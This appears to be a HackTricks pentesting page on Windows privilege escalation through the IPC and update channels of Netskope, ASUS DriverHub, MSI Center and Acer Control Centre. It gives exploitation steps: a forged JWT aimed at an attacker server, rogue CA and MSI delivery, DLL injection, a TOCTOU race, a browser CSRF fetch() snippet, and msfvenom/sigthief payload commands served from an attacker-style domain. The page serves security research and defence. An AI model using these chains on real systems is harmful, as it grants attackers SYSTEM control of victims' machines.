# 滥用企业自动更新程序和特权 IPC（例如 Netskope、ASUS & MSI）

{{#include ../../banners/hacktricks-training.md}}

本页概括了一类存在于企业端点代理和更新程序中的 Windows 本地权限提升链，这类产品通常暴露一个低摩擦的 IPC 接口和一个有特权的更新流程。一个具有代表性的例子是 Netskope Client for Windows < R129 (CVE-2025-0309)，其中低权限用户可以被迫将客户端加入到攻击者控制的服务器，然后交付一个恶意 MSI，由 SYSTEM 服务安装。

可以复用到类似产品的关键思路：
- 滥用特权服务的 localhost IPC，强制 re‑enrollment 或重新配置到攻击者服务器。
- 实现厂商的 update endpoints，部署伪造的 Trusted Root CA，并将 updater 指向恶意的“签名”包。
- 绕过弱签名校验（CN allow\-lists）、可选的 digest 标志和宽松的 MSI 属性。
- 如果 IPC 是“加密的”，从存储在 注册表 中的可全局读取的机器标识符推导 key/IV。
- 如果服务通过 image path/process name 限制调用者，则注入到一个 allow\-listed 进程，或以 suspended 启动该进程并通过最小的 thread\-context patch 引导你的 DLL。

---
## 1) 通过 localhost IPC 强制加入到攻击者服务器

许多代理会随附一个与 SYSTEM 服务通过 localhost TCP 使用 JSON 通信的 user‑mode UI 进程。

在 Netskope 中观察到：
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

利用流程：
1) 构造一个 JWT enrollment token，其 claims 控制后端主机（例如 AddonUrl）。使用 alg=None 以无需签名。
2) 发送 IPC 消息，调用 provisioning 命令，附带你的 JWT 和 tenant name：
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) 该服务开始向你的恶意服务器发起 enrollment/config 请求，例如：
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- If caller verification is path/name\-based, originate the request from a allow\-listed vendor binary (see §4).

---
## 2) 劫持更新通道以 SYSTEM 身份运行代码

一旦客户端与您的服务器通信，实现预期的 endpoints 并将其引导到攻击者 MSI。典型顺序：

1) /v2/config/org/clientconfig → 返回 JSON 配置，包含非常短的 updater interval，例如：
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return a PEM CA certificate. The service installs it into the Local Machine Trusted Root store.
3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake version.

Bypassing common checks seen in the wild:
- Signer CN allow\-list: 服务可能只检查 Subject CN 是否等于 “netSkope Inc” 或 “Netskope, Inc.”。你的 rogue CA 可以签发一个带有该 CN 的 leaf 并对 MSI 签名。
- CERT_DIGEST property: 在 MSI 中包含一个名为 CERT_DIGEST 的良性属性。安装时不强制执行。
- Optional digest enforcement: 配置标志（例如 check_msi_digest=false）会禁用额外的加密校验。

Result: the SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
executing arbitrary code as NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻击者可以重现该加密并以普通用户身份发送有效的加密命令。一般建议：如果一个 agent 突然开始“加密”其 IPC，检查 HKLM 下的 device IDs、product GUIDs、install IDs 等作为加密材料。

---
## 4) Bypassing IPC caller allow\-lists (path/name checks)

一些服务会通过解析 TCP 连接的 PID 并将映像路径/名称与位于 Program Files 下的厂商 allow\-listed 二进制（例如 stagentui.exe、bwansvc.exe、epdlp.exe）进行比较来验证对端。

两个实用的绕过方式：
- 向一个 allow\-listed 进程（例如 nsdiag.exe）注入 DLL，并从内部代理 IPC。
- 以挂起态启动一个 allow\-listed 二进制，并在不使用 CreateRemoteThread 的情况下引导你的代理 DLL（见 §5），以满足驱动强制的防篡改规则。

---
## 5) Tamper\-protection friendly injection: suspended process + NtContinue patch

产品通常会附带一个 minifilter/OB callbacks 驱动（例如 Stadrv），用于从受保护进程的句柄中剥离危险权限：
- Process: 删除 PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUME
- Thread: 限制为 THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZE

一个可靠的用户模式 loader，符合这些约束的步骤：
1) 使用 CreateProcess 创建一个厂商二进制并加上 CREATE_SUSPENDED。
2) 获取你仍被允许的句柄：对进程的 PROCESS_VM_WRITE | PROCESS_VM_OPERATION，以及对线程的 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT（或者如果在已知 RIP 处打补丁则仅需 THREAD_RESUME）。
3) 覆盖 ntdll!NtContinue（或其他早期、保证被映射的 thunk）为一个小的 stub，该 stub 调用 LoadLibraryW 加载你的 DLL 路径，然后跳回。
4) ResumeThread 以触发你在进程内的 stub，从而加载你的 DLL。

因为你没有在一个已被保护的进程上使用 PROCESS_CREATE_THREAD 或 PROCESS_SUSPEND_RESUME（你是新创建它的），驱动的策略得以满足。

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) 自动化了 rogue CA、malicious MSI 签名，并提供所需的端点：/v2/config/org/clientconfig、/config/ca/cert、/v2/checkupdate。
- UpSkope 是一个自定义 IPC 客户端，可构造任意（可选 AES\-加密的）IPC 消息，并包含从 allow\-listed 二进制发起的 suspended\-process 注入。

---
## 1) Browser\-to\-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub 附带一个运行在 127.0.0.1:53000 的用户模式 HTTP 服务 (ADU.exe)，期望来自 https://driverhub.asus.com 的浏览器调用。origin 过滤仅对 Origin 头和由 /asus/v1.0/* 暴露的下载 URL 执行 `string_contains(".asus.com")`。因此，任何攻击者控制的主机（例如 `https://driverhub.asus.com.attacker.tld`）都能通过该检查，并能从 JavaScript 发起会改变状态的请求。更多绕过模式见 [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md)。

Practical flow:
1) 注册一个包含 `.asus.com` 的域名并在上面托管恶意网页。
2) 使用 fetch 或 XHR 调用 `http://127.0.0.1:53000` 上的特权端点（例如 `Reboot`、`UpdateApp`）。
3) 发送处理程序期望的 JSON body — 打包的前端 JS 显示了下面的 schema。
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
即使下面所示的 PowerShell CLI 在将 Origin header 欺骗为受信任的值时也能成功：
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
因此，任何浏览器访问攻击者站点都会变成一个 1\-click（或通过 `onload` 的 0\-click）本地 CSRF，从而驱动一个 SYSTEM helper。

---
## 2) Insecure code\-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` 会下载在 JSON body 中定义的任意可执行文件并将其缓存到 `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`。下载 URL 的验证重用了相同的子字符串逻辑，所以 `http://updates.asus.com.attacker.tld:8000/payload.exe` 会被接受。下载完成后，ADU.exe 仅检查 PE 是否包含签名以及 Subject 字符串是否匹配 ASUS，然后才运行它——没有使用 `WinVerifyTrust`，也没有证书链验证。

要利用该流程：
1) 创建一个 payload（例如 `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
2) 将 ASUS 的 signer 克隆到其中（例如 `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
3) 在一个 `.asus.com` 外观域名上托管 `pwn.exe` 并通过上文的浏览器 CSRF 触发 UpdateApp。

因为 Origin 和 URL 筛选都是 substring\-based，且 signer 检查仅比较字符串，DriverHub 会在其提升的上下文中拉取并执行攻击者的二进制。

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center 的 SYSTEM 服务暴露了一个 TCP 协议，每个帧为 `4-byte ComponentID || 8-byte CommandID || ASCII arguments`。核心组件（Component ID `0f 27 00 00`）包含 `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`。其处理流程为：
1) 将提供的可执行文件复制到 `C:\Windows\Temp\MSI Center SDK.exe`。
2) 通过 `CS_CommonAPI.EX_CA::Verify` 验证签名（certificate subject 必须等于 “MICRO-STAR INTERNATIONAL CO., LTD.” 并且 `WinVerifyTrust` 成功）。
3) 创建一个计划任务，以 SYSTEM 身份并带上 attacker\-controlled arguments 运行该临时文件。

在验证与 `ExecuteTask()` 之间，复制的文件没有被锁定。攻击者可以：
- 发送 Frame A 指向一个合法且由 MSI 签名的二进制（保证签名检查通过并将任务排队）。
- 用重复的 Frame B 消息与之竞速，指向恶意 payload，在验证刚完成后覆盖 `MSI Center SDK.exe`。

当调度器触发时，它会在已验证原始文件的情况下执行被覆盖的 payload，从而获得 SYSTEM 权限。可靠的利用通常使用两个 goroutines/threads 不断刷 CMD_AutoUpdateSDK，直到赢得 TOCTOU 窗口。

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- 每个由 `MSI.CentralServer.exe` 加载的 plugin/DLL 都有一个存储在 `HKLM\SOFTWARE\MSI\MSI_CentralServer` 下的 Component ID。帧的前 4 个字节选择该组件，允许攻击者将命令路由到任意模块。
- 插件可以定义自己的任务执行器。`Support\API_Support.dll` 暴露 `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` 并直接调用 `API_Support.EX_Task::ExecuteTask()`，**没有签名验证**——任何本地用户都可以将其指向 `C:\Users\<user>\Desktop\payload.exe` 并确定性地获得 SYSTEM 执行。
- 使用 Wireshark 嗅探回环或在 dnSpy 中对 .NET 二进制进行动态分析可以快速揭示 Component ↔ command 映射；随后可以用自定义的 Go/Python 客户端重放帧。

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) 暴露 `\\.\pipe\treadstone_service_LightMode`，其 discretionary ACL 允许远程客户端（例如 `\\TARGET\pipe\treadstone_service_LightMode`）访问。发送 command ID `7` 并附带文件路径会调用服务的进程生成例程。
- 客户端库会将一个 magic terminator byte（113）与参数一起序列化。使用 Frida/`TsDotNetLib` 进行动态检测（见 [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) 获取检测提示）表明本地处理程序将该值映射到 `SECURITY_IMPERSONATION_LEVEL` 和 integrity SID，然后调用 `CreateProcessAsUser`。
- 将 113（`0x71`）替换为 114（`0x72`）会进入保持完整 SYSTEM token 并设置高完整性 SID（`S-1-16-12288`）的通用分支。因此，被生成的二进制会以不受限制的 SYSTEM 身份运行，既可在本地也可跨机器。
- 将此与公开的安装器标志（`Setup.exe -nocheck`）结合，即可在实验室 VM 上启用 ACC 并在没有厂商硬件的情况下测试该命名管道。

这些 IPC 漏洞凸显了为什么 localhost 服务必须强制双向身份验证（ALPC SIDs、`ImpersonationLevel=Impersonation` 过滤、token 过滤）以及为什么每个模块的“运行任意二进制”辅助功能必须使用相同的 signer 验证。

---
## 参考资料
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)

{{#include ../../banners/hacktricks-training.md}}
